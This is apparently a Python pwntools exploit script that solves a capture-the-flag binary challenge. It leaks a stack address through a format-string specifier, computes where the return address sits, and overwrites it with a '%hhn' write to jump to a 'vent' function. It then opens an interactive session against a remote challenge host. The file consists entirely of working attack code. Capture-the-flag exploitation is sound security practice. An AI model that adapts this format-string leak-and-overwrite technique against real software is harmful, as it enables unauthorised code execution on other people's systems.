#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal")

context.binary = elf


def conn():
    if args.LOCAL:
        p = process([elf.path])
        if args.GDB:
            context.terminal = 'kitty'
            gdb.attach(p)
    else:
        p = remote("de.irscybersec.ml", 1337)

    return p


def setup_buffer(p):
    for i in range(2):
        p.sendline(b'1')
        p.sendline(b'a'*17)
    p.sendline(b'1')
    p.sendline(b'a'*8)
    
def main():
    p = conn()

    # good luck pwning :)
    setup_buffer(p)

    payload = b"%12$p"
    p.sendline(b'1')
    p.sendline(payload)

    p.sendline(b'1')
    p.sendline(b'pink')

    p.recvuntil(b'killed by ')
    rip = int(p.recvline().strip().decode(), 16) - 0x18
    print(f'rip @ {hex(rip)}')

    setup_buffer(p)

    p.sendline(b'1')
    p.sendline(b'a'*10)

    num_chars = int(hex(elf.sym.vent)[-2:], 16)
    payload = f'%{num_chars}c%9$hhn'
    p.sendline(b'1')
    p.sendline(payload)

    p.sendline(b'1')
    p.sendline(b'pinkaaaa' + p64(rip))

    p.sendline(b'2')

    p.interactive()


if __name__ == "__main__":
    main()
